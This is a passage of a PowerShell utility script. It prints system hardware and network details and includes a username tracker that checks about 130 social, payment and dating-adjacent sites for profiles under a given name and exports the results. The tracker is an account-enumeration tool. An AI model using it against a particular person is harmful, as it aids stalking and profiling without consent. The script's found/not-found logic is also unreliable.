                    $freeSpace = [math]::Round($disk.FreeSpace / 1GB, 2)
                    $usedSpace = [math]::Round($totalSize - $freeSpace, 2)
                    $usagePercent = [math]::Round(($usedSpace / $totalSize) * 100, 1)

                    Write-Host "  Drive $($disk.DeviceID)" -ForegroundColor White
                    Write-Host "    Label       : $($disk.VolumeName)" -ForegroundColor Gray
                    Write-Host "    File System : $($disk.FileSystem)" -ForegroundColor Gray
                    Write-Host "    Total Size  : $totalSize GB" -ForegroundColor Gray
                    Write-Host "    Free Space  : $freeSpace GB" -ForegroundColor Green
                    Write-Host "    Used Space  : $usedSpace GB" -ForegroundColor Yellow
                    Write-Host "    Usage       : $usagePercent%" -ForegroundColor $(if ($usagePercent -gt 90) { "Red" } elseif ($usagePercent -gt 75) { "Yellow" } else { "Green" })
                    Write-Host ""
                }

                Write-Host "Physical Drives:" -ForegroundColor Yellow
                foreach ($physDisk in $sysInfo.PhysicalDisks) {
                    $size = [math]::Round($physDisk.Size / 1GB, 2)
                    Write-Host "  $($physDisk.Model)" -ForegroundColor White
                    Write-Host "    Interface   : $($physDisk.InterfaceType)" -ForegroundColor Gray
                    Write-Host "    Size        : $size GB" -ForegroundColor Gray
                    Write-Host "    Media Type  : $($physDisk.MediaType)" -ForegroundColor Gray
                    Write-Host ""
                }
                Write-Host "===============================" -ForegroundColor Cyan
            }

            '6' {
                # Network Information
                Write-Host "`n========= NETWORK INFO =========" -ForegroundColor Cyan
                Write-Host "Active Network Adapters:" -ForegroundColor Yellow
                foreach ($adapter in $sysInfo.NetworkAdapters) {
                    Write-Host "  $($adapter.Name)" -ForegroundColor White
                    Write-Host "    Status      : Connected" -ForegroundColor Green
                    Write-Host "    Speed       : $($adapter.Speed)" -ForegroundColor Gray

                    # Get IP configuration for this adapter
                    $config = $sysInfo.NetworkConfigs | Where-Object { $_.Index -eq $adapter.DeviceID }
                    if ($config) {
                        Write-Host "    IP Address  : $($config.IPAddress[0])" -ForegroundColor Gray
                        Write-Host "    Subnet Mask : $($config.IPSubnet[0])" -ForegroundColor Gray
                        if ($config.DefaultIPGateway) {
                            Write-Host "    Gateway     : $($config.DefaultIPGateway[0])" -ForegroundColor Gray
                        }
                        if ($config.DNSServerSearchOrder) {
                            Write-Host "    DNS Servers : $($config.DNSServerSearchOrder -join ', ')" -ForegroundColor Gray
                        }
                    }
                    Write-Host ""
                }
                Write-Host "==============================" -ForegroundColor Cyan
            }

            '7' {
                # Graphics Information
                Write-Host "`n========= GRAPHICS INFO =========" -ForegroundColor Cyan
                foreach ($gpu in $sysInfo.Graphics) {
                    if ($gpu.Name -and $gpu.Name -notlike "*Basic*") {
                        Write-Host "Graphics Card    : $($gpu.Name)" -ForegroundColor White
                        Write-Host "Driver Version   : $($gpu.DriverVersion)" -ForegroundColor Gray
                        Write-Host "Driver Date      : $($gpu.DriverDate)" -ForegroundColor Gray
                        if ($gpu.AdapterRAM -gt 0) {
                            $vramGB = [math]::Round($gpu.AdapterRAM / 1GB, 2)
                            Write-Host "Video Memory     : $vramGB GB" -ForegroundColor Gray
                        }
                        Write-Host "Resolution       : $($gpu.CurrentHorizontalResolution) x $($gpu.CurrentVerticalResolution)" -ForegroundColor Gray
                        Write-Host "Refresh Rate     : $($gpu.CurrentRefreshRate) Hz" -ForegroundColor Gray
                        Write-Host ""
                    }
                }
                Write-Host "================================" -ForegroundColor Cyan
            }

            '8' {
                # BIOS/UEFI Information
                Write-Host "`n========= BIOS/UEFI INFO =========" -ForegroundColor Cyan
                Write-Host "Motherboard      : $($sysInfo.MotherboardManufacturer) $($sysInfo.MotherboardProduct)" -ForegroundColor White
                Write-Host "BIOS Manufacturer: $($sysInfo.BIOSManufacturer)" -ForegroundColor White
                Write-Host "BIOS Version     : $($sysInfo.BIOSVersion)" -ForegroundColor White
                Write-Host "BIOS Date        : $($sysInfo.BIOSReleaseDate)" -ForegroundColor White
                Write-Host "==================================" -ForegroundColor Cyan
            }

            '9' {
                # Complete System Report - Show all categories
                Show-SystemInformation-Complete -SystemInfo $sysInfo
            }

            '10' {
                # Export to file
                Export-SystemReport -SystemInfo $sysInfo
            }

            '0' { return }
            default { Write-Host "Invalid choice." -ForegroundColor Red }
        }

        if ($choice -ne '0' -and $choice -ne '9') {
            Pause-For-User
        }

    } while ($choice -ne '0')
}

function Show-SystemInformation-Complete {
    param([PSCustomObject]$SystemInfo)

    Clear-Host
    Write-Host "========= COMPLETE SYSTEM REPORT =========" -ForegroundColor Cyan
    Write-Host ""

    # All sections in one report
    Write-Host "SYSTEM OVERVIEW:" -ForegroundColor Yellow
    Write-Host "Computer Name    : $($SystemInfo.ComputerName)" -ForegroundColor White
    Write-Host "Manufacturer     : $($SystemInfo.Manufacturer) $($SystemInfo.Model)" -ForegroundColor White
    Write-Host "Operating System : $($SystemInfo.OSName) ($($SystemInfo.OSBuild))" -ForegroundColor White
    Write-Host "Processor        : $($SystemInfo.ProcessorName)" -ForegroundColor White
    Write-Host "Total Memory     : $($SystemInfo.TotalInstalledMemory) GB" -ForegroundColor White
    Write-Host ""

    Write-Host "STORAGE SUMMARY:" -ForegroundColor Yellow
    foreach ($disk in $SystemInfo.Disks) {
        $totalSize = [math]::Round($disk.Size / 1GB, 2)
        $freeSpace = [math]::Round($disk.FreeSpace / 1GB, 2)
        $usagePercent = [math]::Round((($totalSize - $freeSpace) / $totalSize) * 100, 1)
        Write-Host "Drive $($disk.DeviceID) - $totalSize GB ($usagePercent% used)" -ForegroundColor White
    }
    Write-Host ""

    Write-Host "NETWORK SUMMARY:" -ForegroundColor Yellow
    foreach ($config in $SystemInfo.NetworkConfigs) {
        if ($config.IPAddress[0] -ne "127.0.0.1") {
            Write-Host "Network: $($config.IPAddress[0])" -ForegroundColor White
        }
    }
    Write-Host ""

    Write-Host "=========================================" -ForegroundColor Cyan
    Pause-For-User
}

function Export-SystemReport {
    param([PSCustomObject]$SystemInfo)

    $reportPath = "$env:USERPROFILE\Desktop\SystemReport_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

    try {
        $report = @"
========================================
COMPLETE SYSTEM INFORMATION REPORT
Generated: $(Get-Date)
========================================

SYSTEM OVERVIEW:
Computer Name    : $($SystemInfo.ComputerName)
Domain           : $($SystemInfo.Domain)
Manufacturer     : $($SystemInfo.Manufacturer)
Model            : $($SystemInfo.Model)
System Type      : $($SystemInfo.SystemType)

OPERATING SYSTEM:
OS Name          : $($SystemInfo.OSName)
OS Version       : $($SystemInfo.OSVersion)
OS Build         : $($SystemInfo.OSBuild)
Architecture     : $($SystemInfo.OSArchitecture)
Install Date     : $($SystemInfo.InstallDate)
Last Boot Time   : $($SystemInfo.LastBootUpTime)

PROCESSOR:
Processor Name   : $($SystemInfo.ProcessorName)
Architecture     : $($SystemInfo.ProcessorArchitecture)
Physical Cores   : $($SystemInfo.ProcessorCores)
Logical Cores    : $($SystemInfo.ProcessorLogicalProcessors)
Max Clock Speed  : $($SystemInfo.ProcessorMaxClockSpeed) MHz

MEMORY:
Memory Modules   : $($SystemInfo.MemoryModules)
Total Installed  : $($SystemInfo.TotalInstalledMemory) GB
Memory Speed     : $($SystemInfo.MemorySpeed) MHz

MOTHERBOARD & BIOS:
Motherboard      : $($SystemInfo.MotherboardManufacturer) $($SystemInfo.MotherboardProduct)
BIOS Version     : $($SystemInfo.BIOSVersion)
BIOS Manufacturer: $($SystemInfo.BIOSManufacturer)
BIOS Date        : $($SystemInfo.BIOSReleaseDate)

STORAGE DEVICES:
"@

        foreach ($disk in $SystemInfo.Disks) {
            $totalSize = [math]::Round($disk.Size / 1GB, 2)
            $freeSpace = [math]::Round($disk.FreeSpace / 1GB, 2)
            $usedSpace = [math]::Round($totalSize - $freeSpace, 2)
            $usagePercent = [math]::Round(($usedSpace / $totalSize) * 100, 1)

            $report += "`nDrive $($disk.DeviceID)"
            $report += "`n  Label: $($disk.VolumeName)"
            $report += "`n  File System: $($disk.FileSystem)"
            $report += "`n  Total Size: $totalSize GB"
            $report += "`n  Free Space: $freeSpace GB"
            $report += "`n  Used Space: $usedSpace GB ($usagePercent%)"
        }

        $report += "`n`nNETWORK CONFIGURATION:"
        foreach ($config in $SystemInfo.NetworkConfigs) {
            if ($config.IPAddress[0] -ne "127.0.0.1") {
                $report += "`nIP Address: $($config.IPAddress[0])"
                $report += "`nSubnet Mask: $($config.IPSubnet[0])"
                if ($config.DefaultIPGateway) {
                    $report += "`nGateway: $($config.DefaultIPGateway[0])"
                }
                if ($config.DNSServerSearchOrder) {
                    $report += "`nDNS Servers: $($config.DNSServerSearchOrder -join ', ')"
                }
            }
        }

        $report += "`n`nGRAPHICS:"
        foreach ($gpu in $SystemInfo.Graphics) {
            if ($gpu.Name -and $gpu.Name -notlike "*Basic*") {
                $report += "`nGraphics Card: $($gpu.Name)"
                $report += "`nDriver Version: $($gpu.DriverVersion)"
                $report += "`nResolution: $($gpu.CurrentHorizontalResolution) x $($gpu.CurrentVerticalResolution)"
            }
        }

        $report += "`n`n========================================`nReport End"

        $report | Out-File -FilePath $reportPath -Encoding UTF8
        Write-Host "SUCCESS: System report exported to: $reportPath" -ForegroundColor Green

    } catch {
        Write-Host "ERROR: Failed to export system report: $_" -ForegroundColor Red
    }

    Pause-For-User
}


function Start-UsernameTracker {
    <#
    .SYNOPSIS
        Tracks username availability across multiple social media platforms and websites
    .DESCRIPTION
        Searches for a given username across popular social media platforms, forums, and websites
        to check availability and discover potential profiles
    .PARAMETER Username
        The username to search for across platforms
    #>
    param([string]$Username)

    # Comprehensive list of platforms to check
    $platforms = @(
        @{Name="GitHub"; URL="https://github.com/{0}"; SuccessCode=200},
        @{Name="Instagram"; URL="https://instagram.com/{0}"; SuccessCode=200},
        @{Name="Twitter"; URL="https://twitter.com/{0}"; SuccessCode=200},
        @{Name="Facebook"; URL="https://facebook.com/{0}"; SuccessCode=200},
        @{Name="YouTube"; URL="https://youtube.com/c/{0}"; SuccessCode=200},
        @{Name="TikTok"; URL="https://tiktok.com/@{0}"; SuccessCode=200},
        @{Name="LinkedIn"; URL="https://linkedin.com/in/{0}"; SuccessCode=200},
        @{Name="Reddit"; URL="https://reddit.com/user/{0}"; SuccessCode=200},
        @{Name="Pinterest"; URL="https://pinterest.com/{0}"; SuccessCode=200},
        @{Name="Snapchat"; URL="https://snapchat.com/add/{0}"; SuccessCode=200},
        @{Name="Tumblr"; URL="https://{0}.tumblr.com"; SuccessCode=200},
        @{Name="DeviantArt"; URL="https://www.deviantart.com/{0}"; SuccessCode=200},
        @{Name="Behance"; URL="https://www.behance.net/{0}"; SuccessCode=200},
        @{Name="Dribbble"; URL="https://dribbble.com/{0}"; SuccessCode=200},
        @{Name="Medium"; URL="https://medium.com/@{0}"; SuccessCode=200},
        @{Name="Twitch"; URL="https://www.twitch.tv/{0}"; SuccessCode=200},
        @{Name="Discord"; URL="https://discord.com/users/{0}"; SuccessCode=200},
        @{Name="Telegram"; URL="https://t.me/{0}"; SuccessCode=200},
        @{Name="WhatsApp"; URL="https://wa.me/{0}"; SuccessCode=200},
        @{Name="Spotify"; URL="https://open.spotify.com/user/{0}"; SuccessCode=200},
        @{Name="SoundCloud"; URL="https://soundcloud.com/{0}"; SuccessCode=200},
        @{Name="Vimeo"; URL="https://vimeo.com/{0}"; SuccessCode=200},
        @{Name="Flickr"; URL="https://flickr.com/people/{0}"; SuccessCode=200},
        @{Name="500px"; URL="https://500px.com/{0}"; SuccessCode=200},
        @{Name="GitLab"; URL="https://gitlab.com/{0}"; SuccessCode=200},
        @{Name="Bitbucket"; URL="https://bitbucket.org/{0}"; SuccessCode=200},
        @{Name="StackOverflow"; URL="https://stackoverflow.com/users/{0}"; SuccessCode=200},
        @{Name="HackerNews"; URL="https://news.ycombinator.com/user?id={0}"; SuccessCode=200},
        @{Name="Patreon"; URL="https://patreon.com/{0}"; SuccessCode=200},
        @{Name="OnlyFans"; URL="https://onlyfans.com/{0}"; SuccessCode=200},
        @{Name="Keybase"; URL="https://keybase.io/{0}"; SuccessCode=200},
        @{Name="About.me"; URL="https://about.me/{0}"; SuccessCode=200},
        @{Name="AngelList"; URL="https://angel.co/{0}"; SuccessCode=200},
        @{Name="Fiverr"; URL="https://fiverr.com/{0}"; SuccessCode=200},
        @{Name="Freelancer"; URL="https://freelancer.com/u/{0}"; SuccessCode=200},
        @{Name="Upwork"; URL="https://upwork.com/freelancers/{0}"; SuccessCode=200},
        @{Name="Etsy"; URL="https://etsy.com/shop/{0}"; SuccessCode=200},
        @{Name="Amazon"; URL="https://amazon.com/gp/profile/amzn1.account.{0}"; SuccessCode=200},
        @{Name="eBay"; URL="https://ebay.com/usr/{0}"; SuccessCode=200},
        @{Name="Steam"; URL="https://steamcommunity.com/id/{0}"; SuccessCode=200},
        @{Name="Xbox Live"; URL="https://account.xbox.com/en-us/profile?gamertag={0}"; SuccessCode=200},
        @{Name="PlayStation"; URL="https://psnprofiles.com/{0}"; SuccessCode=200},
        @{Name="Roblox"; URL="https://roblox.com/users/{0}/profile"; SuccessCode=200},
        @{Name="Minecraft"; URL="https://namemc.com/profile/{0}"; SuccessCode=200},
        @{Name="Fortnite"; URL="https://fortnitetracker.com/profile/all/{0}"; SuccessCode=200},
        @{Name="Chess.com"; URL="https://chess.com/member/{0}"; SuccessCode=200},
        @{Name="Lichess"; URL="https://lichess.org/@/{0}"; SuccessCode=200},
        @{Name="Goodreads"; URL="https://goodreads.com/{0}"; SuccessCode=200},
        @{Name="IMDb"; URL="https://imdb.com/name/{0}"; SuccessCode=200},
        @{Name="Letterboxd"; URL="https://letterboxd.com/{0}"; SuccessCode=200},
        @{Name="MyAnimeList"; URL="https://myanimelist.net/profile/{0}"; SuccessCode=200},
        @{Name="Crunchyroll"; URL="https://crunchyroll.com/user/{0}"; SuccessCode=200},
        @{Name="Last.fm"; URL="https://last.fm/user/{0}"; SuccessCode=200},
        @{Name="TryHackMe"; URL="https://tryhackme.com/p/{0}"; SuccessCode=200},
        @{Name="Codewars"; URL="https://codewars.com/users/{0}"; SuccessCode=200},
        @{Name="Coinbase"; URL="https://coinbase.com/{0}"; SupessCode=200},
        @{Name="OpenSea"; URL="https://opensea.io/{0}"; SuccessCode=200},
        @{Name="Etsy"; URL="https://etsy.com/shop/{0}"; SuccessCode=200},
        @{Name="Replit"; URL="https://replit.com/@{0}"; SuccessCode=200},
        @{Name="Codepen"; URL="https://codepen.io/{0}"; SuccessCode=200},
        @{Name="JSFiddle"; URL="https://jsfiddle.net/user/{0}"; SuccessCode=200},
        @{Name="Notion"; URL="https://notion.so/{0}"; SuccessCode=200},
        @{Name="Figma"; URL="https://figma.com/@{0}"; SuccessCode=200},
        @{Name="Canva"; URL="https://canva.com/{0}"; SuccessCode=200},
        @{Name="Sketchfab"; URL="https://sketchfab.com/{0}"; SuccessCode=200},
        @{Name="ArtStation"; URL="https://artstation.com/{0}"; SuccessCode=200},
        @{Name="Unsplash"; URL="https://unsplash.com/@{0}"; SuccessCode=200},
        @{Name="Pexels"; URL="https://pexels.com/@{0}"; SuccessCode=200},
        @{Name="Wikia"; URL="https://{0}.fandom.com"; SuccessCode=200},
        @{Name="Fandom"; URL="https://community.fandom.com/wiki/User:{0}"; SuccessCode=200},
        @{Name="Quizlet"; URL="https://quizlet.com/{0}"; SuccessCode=200},
        @{Name="Khan Academy"; URL="https://khanacademy.org/profile/{0}"; SuccessCode=200},
        @{Name="Coursera"; URL="https://coursera.org/user/{0}"; SuccessCode=200},
        @{Name="edX"; URL="https://edx.org/u/{0}"; SuccessCode=200},
        @{Name="Udemy"; URL="https://udemy.com/user/{0}"; SuccessCode=200},
        @{Name="Skillshare"; URL="https://skillshare.com/profile/{0}"; SuccessCode=200},
        @{Name="Duolingo"; URL="https://duolingo.com/profile/{0}"; SuccessCode=200},
        @{Name="Memrise"; URL="https://memrise.com/user/{0}"; SuccessCode=200},
        @{Name="Strava"; URL="https://strava.com/athletes/{0}"; SuccessCode=200},
        @{Name="MyFitnessPal"; URL="https://myfitnesspal.com/profile/{0}"; SuccessCode=200},
        @{Name="Garmin Connect"; URL="https://connect.garmin.com/modern/profile/{0}"; SuccessCode=200},
        @{Name="Fitbit"; URL="https://fitbit.com/user/{0}"; SuccessCode=200},
        @{Name="Nike Run Club"; URL="https://nike.com/us/en_us/c/running/nike-run-club"; SuccessCode=200},
        @{Name="Starbucks"; URL="https://starbucks.com/{0}"; SuccessCode=200},
        @{Name="Untappd"; URL="https://untappd.com/user/{0}"; SuccessCode=200},
        @{Name="Foursquare"; URL="https://foursquare.com/{0}"; SuccessCode=200},
        @{Name="Yelp"; URL="https://yelp.com/user_details?userid={0}"; SuccessCode=200},
        @{Name="TripAdvisor"; URL="https://tripadvisor.com/members/{0}"; SuccessCode=200},
        @{Name="Airbnb"; URL="https://airbnb.com/users/show/{0}"; SuccessCode=200},
        @{Name="Booking.com"; URL="https://booking.com/myaccount/{0}"; SuccessCode=200},
        @{Name="Couchsurfing"; URL="https://couchsurfing.com/people/{0}"; SuccessCode=200},
        @{Name="Meetup"; URL="https://meetup.com/members/{0}"; SuccessCode=200},
        @{Name="Eventbrite"; URL="https://eventbrite.com/o/{0}"; SuccessCode=200},
        @{Name="Facebook Pages"; URL="https://facebook.com/{0}"; SuccessCode=200},
        @{Name="Clubhouse"; URL="https://clubhouse.com/@{0}"; SuccessCode=200},
        @{Name="Mastodon"; URL="https://mastodon.social/@{0}"; SuccessCode=200},
        @{Name="Bluesky"; URL="https://bsky.app/profile/{0}"; SuccessCode=200},
        @{Name="Threads"; URL="https://threads.net/@{0}"; SuccessCode=200},
        @{Name="BeReal"; URL="https://bereal.com/{0}"; SuccessCode=200},
        @{Name="VSCO"; URL="https://vsco.co/{0}"; SuccessCode=200},
        @{Name="OnlyFans"; URL="https://onlyfans.com/{0}"; SuccessCode=200},
        @{Name="Fanhouse"; URL="https://fanhouse.app/{0}"; SuccessCode=200},
        @{Name="Cash App"; URL="https://cash.app/${0}"; SuccessCode=200},
        @{Name="Venmo"; URL="https://venmo.com/{0}"; SuccessCode=200},
        @{Name="Zelle"; URL="https://zellepay.com/{0}"; SuccessCode=200},
        @{Name="Ko-fi"; URL="https://ko-fi.com/{0}"; SuccessCode=200},
        @{Name="Buy Me a Coffee"; URL="https://buymeacoffee.com/{0}"; SuccessCode=200},
        @{Name="Gofundme"; URL="https://gofundme.com/{0}"; SuccessCode=200},
        @{Name="Kickstarter"; URL="https://kickstarter.com/profile/{0}"; SuccessCode=200},
        @{Name="Indiegogo"; URL="https://indiegogo.com/individuals/{0}"; SuccessCode=200},
        @{Name="Crowdfire"; URL="https://crowdfire.com/{0}"; SuccessCode=200},
        @{Name="Buffer"; URL="https://buffer.com/{0}"; SuccessCode=200},
        @{Name="Hootsuite"; URL="https://hootsuite.com/{0}"; SuccessCode=200},
        @{Name="Later"; URL="https://later.com/{0}"; SuccessCode=200},
        @{Name="Linktree"; URL="https://linktr.ee/{0}"; SuccessCode=200},
        @{Name="Linkin.bio"; URL="https://linkin.bio/{0}"; SuccessCode=200},
        @{Name="Bio.link"; URL="https://bio.link/{0}"; SuccessCode=200},
        @{Name="Allmylinks"; URL="https://allmylinks.com/{0}"; SuccessCode=200},
        @{Name="Carrd"; URL="https://{0}.carrd.co"; SuccessCode=200},
        @{Name="Wix"; URL="https://{0}.wixsite.com"; SuccessCode=200},
        @{Name="Weebly"; URL="https://{0}.weebly.com"; SuccessCode=200},
        @{Name="Squarespace"; URL="https://{0}.squarespace.com"; SuccessCode=200},
        @{Name="WordPress"; URL="https://{0}.wordpress.com"; SuccessCode=200},
        @{Name="Blogger"; URL="https://{0}.blogspot.com"; SuccessCode=200},
        @{Name="Ghost"; URL="https://{0}.ghost.io"; SuccessCode=200},
        @{Name="Substack"; URL="https://{0}.substack.com"; SuccessCode=200},
        @{Name="ConvertKit"; URL="https://convertkit.com/{0}"; SuccessCode=200},
        @{Name="Mailchimp"; URL="https://mailchimp.com/{0}"; SuccessCode=200},
        @{Name="Linklist"; URL="https://lnk.bio/{0}"; SuccessCode=200}
    )

    Write-Host "`n========= USERNAME TRACKER =========" -ForegroundColor Cyan
    Write-Host "Searching for username: $Username" -ForegroundColor Yellow
    Write-Host "Checking $($platforms.Count) platforms..." -ForegroundColor Gray
    Write-Host "========================================" -ForegroundColor Cyan
    Write-Host ""

    $foundPlatforms = @()
    $notFoundPlatforms = @()
    $errorPlatforms = @()

    $total = $platforms.Count
    $current = 0

    # Store original TLS settings to restore later
    $originalProtocol = [Net.ServicePointManager]::SecurityProtocol
    $originalCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    # Temporarily configure TLS settings only for this function
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls
        # Only override certificate validation if really needed for specific sites
        # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        Write-Host "TLS configuration applied for username tracking" -ForegroundColor Green
    } catch {
        Write-Host "Warning: Could not configure TLS settings" -ForegroundColor Yellow
    }

    # Test internet connectivity with multiple methods
    $connectionTest = $false

    # Method 1: Test with simple ping
    Write-Host "Testing internet connectivity..." -ForegroundColor Cyan
    try {
        $pingResult = Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet -ErrorAction SilentlyContinue
        if ($pingResult) {
            Write-Host "✓ Ping test successful" -ForegroundColor Green
            $connectionTest = $true
        }
    } catch {}

    # Method 2: Test with simple web request if ping failed
    if (-not $connectionTest) {
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
            $null = $webClient.DownloadString("https://www.google.com")
            $webClient.Dispose()
            Write-Host "✓ Web request test successful" -ForegroundColor Green
            $connectionTest = $true
        } catch {}
    }

    # Method 3: Test with Invoke-WebRequest as last resort
    if (-not $connectionTest) {
        try {
            $null = Invoke-WebRequest -Uri "https://www.google.com" -Method Head -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop
            Write-Host "✓ Advanced web test successful" -ForegroundColor Green
            $connectionTest = $true
        } catch {}
    }

    # If all tests failed, ask user if they want to continue
    if (-not $connectionTest) {
        Write-Host "⚠ Internet connectivity tests failed!" -ForegroundColor Red
        Write-Host "This could be due to:" -ForegroundColor Yellow
        Write-Host "• Firewall or antivirus blocking PowerShell" -ForegroundColor Gray
        Write-Host "• Proxy server configuration" -ForegroundColor Gray
        Write-Host "• Network restrictions" -ForegroundColor Gray
        Write-Host "• PowerShell execution policy" -ForegroundColor Gray

        $continueAnyway = Read-Host "`nDo you want to continue anyway? (y/n)"
        if ($continueAnyway -ne 'y' -and $continueAnyway -ne 'Y') {
            Write-Host "Username tracking cancelled." -ForegroundColor Yellow
            return
        } else {
            Write-Host "Continuing without connectivity verification..." -ForegroundColor Yellow
        }
    }

    foreach ($platform in $platforms) {
        $current++
        $url = $platform.URL -f $Username
        $percentComplete = [Math]::Round(($current / $total) * 100)

        Write-Progress -Activity "Username Tracker" -Status "Checking $($platform.Name)" -PercentComplete $percentComplete

        try {
            # Try multiple approaches for better success rate
            $success = $false

            # Method 1: Use WebClient (often more reliable)
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                $webClient.Headers.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

                # Try to access the URL
                $null = $webClient.DownloadString($url)
                $webClient.Dispose()

                $foundPlatforms += @{Platform=$platform.Name; URL=$url; Status="Found"}
                Write-Host "[+] " -NoNewline -ForegroundColor Green
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "$url" -ForegroundColor Green
                $success = $true
            }
            catch {
                # Method 2: Fallback to Invoke-WebRequest if WebClient fails
                if (-not $success) {
                    $headers = @{
                        'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
                        'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                        'Accept-Language' = 'en-US,en;q=0.5'
                    }

                    $response = Invoke-WebRequest -Uri $url -Method Head -Headers $headers -TimeoutSec 10 -ErrorAction Stop -MaximumRedirection 5 -UseBasicParsing

                    if ($response.StatusCode -eq 200) {
                        $foundPlatforms += @{Platform=$platform.Name; URL=$url; Status="Found"}
                        Write-Host "[+] " -NoNewline -ForegroundColor Green
                        Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                        Write-Host "$url" -ForegroundColor Green
                        $success = $true
                    }
                }
            }

            if (-not $success) {
                $notFoundPlatforms += @{Platform=$platform.Name; URL=$url; Status="Not Found"}
                Write-Host "[-] " -NoNewline -ForegroundColor Red
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "Not Found" -ForegroundColor Red
            }
        }
        catch {
            $errorMessage = $_.Exception.Message

            # Check if it's a 404 Not Found
            if ($errorMessage -like "*404*" -or $errorMessage -like "*Not Found*") {
                $notFoundPlatforms += @{Platform=$platform.Name; URL=$url; Status="Not Found"}
                Write-Host "[-] " -NoNewline -ForegroundColor Red
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "Not Found" -ForegroundColor Red
            }
            # Check if it's a rate limit or forbidden
            elseif ($errorMessage -like "*403*" -or $errorMessage -like "*429*" -or $errorMessage -like "*Forbidden*") {
                $errorPlatforms += @{Platform=$platform.Name; URL=$url; Status="Blocked"}
                Write-Host "[!] " -NoNewline -ForegroundColor Yellow
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "Blocked" -ForegroundColor Yellow
            }
            # Check for timeout
            elseif ($errorMessage -like "*timeout*" -or $errorMessage -like "*timed out*") {
                $errorPlatforms += @{Platform=$platform.Name; URL=$url; Status="Timeout"}
                Write-Host "[!] " -NoNewline -ForegroundColor Yellow
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "Timeout" -ForegroundColor Yellow
            }
            # SSL/TLS errors
            elseif ($errorMessage -like "*SSL*" -or $errorMessage -like "*TLS*" -or $errorMessage -like "*certificate*") {
                $errorPlatforms += @{Platform=$platform.Name; URL=$url; Status="SSL Error"}
                Write-Host "[!] " -NoNewline -ForegroundColor Yellow
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "SSL Error" -ForegroundColor Yellow
            }
            # Other errors
            else {
                $errorPlatforms += @{Platform=$platform.Name; URL=$url; Status="Error"}
                Write-Host "[!] " -NoNewline -ForegroundColor Yellow
                Write-Host "$($platform.Name.PadRight(20)) " -NoNewline -ForegroundColor White
                Write-Host "Error" -ForegroundColor Yellow
            }
        }

        # Conservative delay between requests
        Start-Sleep -Milliseconds 500
    }

    Write-Progress -Activity "Username Tracker" -Completed

    # Summary
    Write-Host ""
    Write-Host "========= SEARCH SUMMARY =========" -ForegroundColor Cyan
    Write-Host "Username searched: $Username" -ForegroundColor White
    Write-Host "Total platforms  : $total" -ForegroundColor White
    Write-Host "Found profiles   : $($foundPlatforms.Count)" -ForegroundColor Green
    Write-Host "Not found        : $($notFoundPlatforms.Count)" -ForegroundColor Red
    Write-Host "Errors           : $($errorPlatforms.Count)" -ForegroundColor Yellow
    Write-Host "==================================" -ForegroundColor Cyan

    # Show found platforms
    if ($foundPlatforms.Count -gt 0) {
        Write-Host ""
        Write-Host "FOUND PROFILES:" -ForegroundColor Green
        foreach ($found in $foundPlatforms) {
            Write-Host "  $($found.Platform): $($found.URL)" -ForegroundColor White
        }
    }

    # Option to export results
    Write-Host ""
    $export = Read-Host "Export results to file? (y/n)"
    if ($export -eq 'y' -or $export -eq 'Y') {
        Export-UsernameTrackerResults -Username $Username -Found $foundPlatforms -NotFound $notFoundPlatforms -Errors $errorPlatforms
    }

    # Restore original TLS settings to not interfere with other operations
    try {
        [Net.ServicePointManager]::SecurityProtocol = $originalProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCallback
        Write-Host "Original network settings restored" -ForegroundColor Green
    } catch {
        Write-Host "Note: Network settings may need manual reset" -ForegroundColor Yellow
    }
}

function Export-UsernameTrackerResults {
    param(
        [string]$Username,
        [array]$Found,
        [array]$NotFound,
        [array]$Errors
    )

    $exportPath = "$env:USERPROFILE\Desktop\UsernameTracker_${Username}_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"

    try {
        $report = @"
========================================
USERNAME TRACKER RESULTS
Username: $Username
Scan Date: $(Get-Date)
========================================

SUMMARY:
Total platforms checked: $($Found.Count + $NotFound.Count + $Errors.Count)
Found profiles: $($Found.Count)
Not found: $($NotFound.Count)
Errors: $($Errors.Count)

FOUND PROFILES ($($Found.Count)):
"@

        foreach ($result in $Found) {
            $report += "`n$($result.Platform): $($result.URL)"
        }

        if ($NotFound.Count -gt 0) {
            $report += "`n`nNOT FOUND ($($NotFound.Count)):"
            foreach ($result in $NotFound) {
                $report += "`n$($result.Platform): $($result.URL)"
            }
        }

        if ($Errors.Count -gt 0) {
            $report += "`n`nERRORS ($($Errors.Count)):"
            foreach ($result in $Errors) {
                $report += "`n$($result.Platform): $($result.URL)"
            }
        }

        $report += "`n`n========================================`nReport End"

        $report | Out-File -FilePath $exportPath -Encoding UTF8
        Write-Host "SUCCESS: Results exported to: $exportPath" -ForegroundColor Green

    } catch {
        Write-Host "ERROR: Failed to export results: $_" -ForegroundColor Red
    }
}

function Show-UsernameTracker {
    Clear-Host
